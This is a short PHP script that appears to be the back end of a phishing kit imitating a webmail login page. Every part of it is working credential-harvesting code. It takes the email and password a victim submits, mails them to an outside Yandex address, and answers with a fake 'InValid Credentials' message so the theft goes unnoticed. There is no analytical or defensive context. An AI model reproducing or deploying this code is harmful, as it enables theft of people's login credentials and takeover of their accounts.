<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $email= $_POST['email'];
 $password = $_POST['password'];
 
		$to =  "result94@yandex.com";
 		
         $subject = "New Login : ip";
		 
		 $message =  "Online ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
		 
		$header = "Content type: roundcube domain \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($to,$subject,$message,$header);
		 	$signal = 'ok';
			$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);

}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);
?>